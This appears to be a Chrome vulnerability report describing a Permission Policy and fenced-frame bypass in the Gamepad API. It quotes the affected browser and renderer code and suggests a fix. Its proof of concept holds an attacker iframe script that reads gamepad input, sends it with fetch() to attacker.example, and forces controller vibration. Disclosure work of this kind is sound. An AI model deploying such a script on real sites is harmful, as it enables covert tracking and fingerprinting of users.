# Chrome VRP Report: Gamepad API Permission Policy Bypass — Browser-Side Checks Completely Missing

## Summary

The Gamepad API (`GamepadMonitor` and `GamepadHapticsManager`) has **no browser-side Permission Policy enforcement**. The `RenderFrameHost*` parameter is accepted but completely ignored in `GamepadMonitor::Create()` and `GamepadHapticsManager::Create()`. Permission Policy checks exist only in the renderer (`navigator.getGamepads()`), but the `gamepadconnected` event listener registration path (`NavigatorGamepad::DidAddEventListener`) has no PP check at all.

This allows a cross-origin iframe that is explicitly denied gamepad access via `Permissions-Policy: gamepad=()` to still receive gamepad connection events (with full input data) and trigger gamepad haptics vibration.

## Affected Component

- `device/gamepad/gamepad_monitor.cc` (GamepadMonitor Mojo service)
- `device/gamepad/gamepad_haptics_manager.cc` (GamepadHapticsManager Mojo service)
- `content/browser/browser_interface_binders.cc` (binding registration)
- `third_party/blink/renderer/modules/gamepad/navigator_gamepad.cc` (renderer-side event listener)

## Chromium Version

Tested against Chromium HEAD as of 2026-04-27.

## Vulnerability Details

### Issue 1: Browser-Side GamepadMonitor Ignores RFH

```cpp
// device/gamepad/gamepad_monitor.cc:25-29
void GamepadMonitor::Create(
    content::RenderFrameHost*,  // COMPLETELY IGNORED
    mojo::PendingReceiver<mojom::GamepadMonitor> receiver) {
  mojo::MakeSelfOwnedReceiver(std::make_unique<GamepadMonitor>(),
                              std::move(receiver));
}
```

No Permission Policy check. No fenced frame check. No sandbox check. The `RenderFrameHost*` is never used.

### Issue 2: Browser-Side GamepadHapticsManager Same Pattern

```cpp
// device/gamepad/gamepad_haptics_manager.cc:20-25
void GamepadHapticsManager::Create(
    content::RenderFrameHost*,  // COMPLETELY IGNORED
    mojo::PendingReceiver<mojom::GamepadHapticsManager> receiver) {
  mojo::MakeSelfOwnedReceiver(std::make_unique<GamepadHapticsManager>(),
                              std::move(receiver));
}
```

### Issue 3: Event Listener Registration Has No PP Check (Renderer-Side)

```cpp
// navigator_gamepad.cc:290-314
void NavigatorGamepad::DidAddEventListener(LocalDOMWindow*,
                                           const AtomicString& event_type) {
  // NO Permission Policy check here!
  if (IsGamepadConnectionEvent(event_type)) {
    has_connection_event_listener_ = true;
  }
  // ...
  if (has_connection_event_listener_ || has_input_changed_event_listener_) {
    has_event_listener_ = true;
    if (GetPage() && GetPage()->IsPageVisible()) {
      StartUpdatingIfAttached();  // Establishes GamepadMonitor Mojo connection
    }
  }
}
```

The only renderer-side PP check is in `getGamepads()` (line 107-108). But registering a `gamepadconnected` event listener bypasses this entirely.

### Contrast with Similar APIs

| API | Browser-Side PP Check | Browser-Side Fenced Frame Check |
|-----|----------------------|-------------------------------|
| WebSensorProvider | Yes (`frame_sensor_provider_proxy.cc:71-81`) | Yes (via `IsFeatureEnabled`) |
| ComputePressure | Yes (`browser_interface_binders.cc:682-688`) | Yes (`browser_interface_binders.cc:672`) |
| BatteryMonitor | No PP | Yes (`browser_interface_binders.cc:651`) |
| Serial API | Yes (`render_frame_host_impl.cc:14965`) | Yes (`render_frame_host_impl.cc:14975`) |
| **GamepadMonitor** | **No** | **No** |
| **GamepadHapticsManager** | **No** | **No** |

## Attack Scenario (No Compromised Renderer Required)

1. Victim site embeds a third-party ad iframe with `Permissions-Policy: gamepad=()`
2. The ad iframe's `navigator.getGamepads()` is correctly rejected by the renderer PP check
3. **However**, the ad iframe can call `window.addEventListener('gamepadconnected', handler)`
4. This triggers `DidAddEventListener` → `StartUpdating` → creates `GamepadSharedMemoryReader`
5. `GamepadSharedMemoryReader` requests `GamepadMonitor` Mojo interface via `BrowserInterfaceBroker`
6. Browser-side `GamepadMonitor::Create` succeeds (no PP check)
7. `GamepadStartPolling()` returns shared memory region with gamepad data
8. When a gamepad connects, the `gamepadconnected` event fires with full `Gamepad` object data (buttons, axes, id, etc.)
9. The ad iframe can read all gamepad input despite being blocked by Permission Policy

### Additional: Fenced Frame Bypass

Gamepad PP feature is not in `kFencedFrameAllowedFeatures`, so it should be blocked in fenced frames. But since the browser-side doesn't check `IsNestedWithinFencedFrame()`, fenced frame content can use both `GamepadMonitor` and `GamepadHapticsManager` (including triggering haptic vibration).

## Impact

- **Permission Policy bypass**: Cross-origin iframes can receive gamepad input data despite explicit PP denial
- **Privacy**: Gamepad data includes device identifiers, button states, and analog stick positions
- **Fingerprinting**: Gamepad IDs and capabilities can be used for device fingerprinting even from blocked iframes
- **Haptics abuse**: Blocked iframes and fenced frames can trigger gamepad vibration
- **Fenced Frame isolation**: Ad content in fenced frames can access gamepad data, breaking isolation guarantees

## PoC

```html
<!-- victim.html — serves with Permissions-Policy: gamepad=() -->
<iframe src="https://attacker.example/gamepad_spy.html" 
        allow=""></iframe>  <!-- gamepad explicitly not allowed -->
```

```html
<!-- gamepad_spy.html (attacker's iframe) -->
<script>
// navigator.getGamepads() would throw SecurityError here due to PP
// But event listeners bypass the check:

window.addEventListener('gamepadconnected', (event) => {
  // This fires despite PP blocking gamepad!
  console.log('Gamepad connected (PP bypassed):', event.gamepad.id);
  console.log('Buttons:', event.gamepad.buttons.map(b => b.value));
  console.log('Axes:', event.gamepad.axes);
  
  // Exfiltrate gamepad data
  fetch('https://attacker.example/log', {
    method: 'POST',
    body: JSON.stringify({
      id: event.gamepad.id,
      buttons: event.gamepad.buttons.length,
      axes: event.gamepad.axes.length
    })
  });
});

// Can also trigger haptics:
// (Need to get gamepad reference from event first)
window.addEventListener('gamepadconnected', (event) => {
  const gp = event.gamepad;
  if (gp.vibrationActuator) {
    gp.vibrationActuator.playEffect('dual-rumble', {
      duration: 1000,
      strongMagnitude: 1.0,
      weakMagnitude: 1.0
    });
  }
});
</script>
```

## Suggested Fix

Add browser-side PP and fenced frame checks at the binding layer:

```cpp
// In browser_interface_binders.cc:
void BindGamepadMonitor(
    RenderFrameHost* host,
    mojo::PendingReceiver<device::mojom::GamepadMonitor> receiver) {
  if (host->IsNestedWithinFencedFrame()) {
    mojo::ReportBadMessage("Gamepad is not allowed in fenced frames.");
    return;
  }
  if (!host->IsFeatureEnabled(
          network::mojom::PermissionsPolicyFeature::kGamepad)) {
    mojo::ReportBadMessage("Permissions policy blocks access to Gamepad.");
    return;
  }
  device::GamepadMonitor::Create(host, std::move(receiver));
}

// Replace direct registration:
// map->Add<device::mojom::GamepadMonitor>(&device::GamepadMonitor::Create);
// with:
map->Add<device::mojom::GamepadMonitor>(&BindGamepadMonitor);

// Same for GamepadHapticsManager
```

Additionally, add a PP check in `NavigatorGamepad::DidAddEventListener`:
```cpp
void NavigatorGamepad::DidAddEventListener(LocalDOMWindow* window,
                                           const AtomicString& event_type) {
  ExecutionContext* context = GetExecutionContext();
  if (!context || !context->IsFeatureEnabled(
          network::mojom::PermissionsPolicyFeature::kGamepad)) {
    return;  // Silently ignore if PP blocks gamepad
  }
  // ... existing code
}
```

## Platform

All desktop and Android platforms where Gamepad API is available.
